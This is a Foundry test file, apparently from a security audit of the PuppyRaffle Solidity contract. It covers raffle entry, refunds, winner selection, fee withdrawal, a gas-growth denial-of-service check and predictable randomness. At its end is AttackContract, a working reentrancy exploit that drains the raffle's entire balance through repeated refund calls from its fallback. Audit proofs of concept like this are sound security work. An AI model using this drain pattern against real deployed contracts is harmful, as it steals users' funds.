// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract AuditRaffle is Test {

    address owner = makeAddr("owner");
    address test1 = makeAddr("test1");
    address test2 = makeAddr("test2");
    address test3 = makeAddr("test3");
    address feeAddress = makeAddr("fee holder");
    address alice = makeAddr("alice");

    uint256 entranceFee = 1e18;

    uint256 raffleduration = 500;

    PuppyRaffle raffle; 

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(entranceFee,feeAddress,raffleduration);
    }

    function test_enterRaffleTest1() public {
        address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);

        address[] memory players1 = new address[](2);
        players1[0] = address(feeAddress);
        players1[1] = address(alice);
        raffle.enterRaffle{value : 2e18}(players1);

        uint256 test = raffle.getActivePlayerIndex(address(feeAddress));
        assertEq(test, 4);
        assertEq(raffle.getActivePlayerIndex(address(alice)),5);
        assertEq(raffle.getActivePlayerIndex(address(test1)),0);
        assertEq(raffle.getActivePlayerIndex(address(1233)),0);
    }

    function testRefundRaffle() public {
        address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);

        uint256 bal = address(test2).balance;
        console.log(bal);

        vm.prank(test2);
        raffle.refund(1);

        assert(bal != address(test2).balance);

        address x  = raffle.players(1);
        assertEq(x, address(0));

        vm.prank(alice);
        vm.expectRevert();
        raffle.refund(0);

    }

    function testActivePlayer() public {
        address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);

        console.log(raffle.players(0));
        console.log(raffle.players(1));
        console.log(raffle.players(2));
        console.log(raffle.players(3));

        uint256 x = raffle.getActivePlayerIndex(address(test3));
        assertEq(x, 2);
        uint256 y = raffle.getActivePlayerIndex(address(test1));
        assertEq(y, 0);
    }

    function testChangeFeeAddress(address x) public {
        address y = x;
        vm.prank(owner);
        raffle.changeFeeAddress(y);
    }

    function testFuzzentrance(address[] memory x) public {
        raffle.enterRaffle(x);
    }
    
    function testabiencoding() public {
        vm.prevrandao(bytes32(uint256(42)));
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        console.log(rarity);

        // vm.warp(29722);
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) %5;
       console.log(winnerIndex);
        
    }

    function testselectWinner() public {
        address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);
        

        // vm.warp(block.timestamp + 501);
        // // vm.prevrandao(bytes32(uint256(12123241234)));
        // raffle.selectWinner();
        // string memory x = raffle.tokenURI(0);
        // console.log(x);

        vm.warp(block.timestamp + 501);
        vm.prevrandao(bytes32(uint256(121234)));
        raffle.selectWinner();
        string memory x = raffle.tokenURI(0);
        console.log(x);

    }

    function testSelectwinnerSHouldfailonlessplayers() public {
        address[] memory players = new address[](3);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        raffle.enterRaffle{value : 3e18}(players);

        vm.warp(block.timestamp + 501);
        vm.expectRevert();
        raffle.selectWinner();
        // string memory x = raffle.tokenURI(0);
        // console.log(x);
    }

    function testcheckfeetowithdraw() public {
         address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);
        

        vm.warp(block.timestamp + 501);
        // vm.prevrandao(bytes32(uint256(12123241234)));
        raffle.selectWinner();
        string memory x = raffle.tokenURI(0);
        console.log(x);

        uint256 z = address(feeAddress).balance;
        raffle.withdrawFees();
        uint256 l = address(feeAddress).balance;
        assert(z<l);
    }
    
    function testPossibleDOS() public {

        vm.txGasPrice(1);
        address[] memory players = new address[](100);
        for (uint i = 0; i < 100; i++) {
            players[i] =address(uint160(i));
        }
        uint256 gasFirst100 = gasleft();
        raffle.enterRaffle{value: 100e18}(players);
        uint256 gasEnd100 = gasleft();
        console.log("The gas after first 100 deposit", (gasFirst100 - gasEnd100 )* tx.gasprice);

        address[] memory playersNew = new address[](10);
        for (uint i = 0; i < 10; i++) {
            playersNew[i] =address(i + 100);
        }
        uint256 gasSecond10 = gasleft();
        raffle.enterRaffle{value: 10e18}(playersNew);
        uint256 gasSecondEND10 = gasleft();
        console.log("The gas after first 100 deposit", (gasSecond10 - gasSecondEND10) * tx.gasprice);
    }

    function testRenetrancyRefundFunc() public {
        address[] memory players = new address[](4);
        players[0] = address(test1);
        players[1] = address(test2);
        players[2] = address(test3);
        players[3] = address(owner);
        raffle.enterRaffle{value : 4e18}(players);

    AttackContract attacker = new AttackContract(address(raffle));
    vm.deal(address(attacker), 1e18);
    uint256 startingAttackerBalance = address(attacker).balance;
    console.log(startingAttackerBalance);
    uint256 startingContractBalance = address(raffle).balance;
    console.log(startingContractBalance);
    attacker.attack();

    uint256 endingAttackerBalance = address(attacker).balance;
    console.log(endingAttackerBalance);
    uint256 endingContractBalance = address(raffle).balance;
    console.log(endingContractBalance);
    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
    assertEq(endingContractBalance, 0);
    }

    function testWithdrawFeeshouldFAil() public {
        address[] memory players = new address[](20);
        for (uint i = 0; i < 20; i++) {
            players[i] = address(i);
        }
        raffle.enterRaffle{value: 20e18}(players);

        vm.expectRevert();
        raffle.withdrawFees();
    }

}

contract AttackContract {
    PuppyRaffle immutable i_puppy;
    uint256 entranceFee;
    uint256 indexattacker;

    constructor(address raffle) {
        i_puppy = PuppyRaffle(raffle);
    }

    function withdraw() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        i_puppy.enterRaffle{value : 1e18}(players);
        indexattacker  =  i_puppy.getActivePlayerIndex(address(this));
        i_puppy.refund(indexattacker);
    }

    fallback() external payable {
        if (address(i_puppy).balance > 0) {
            i_puppy.refund(indexattacker);
        }
    }
}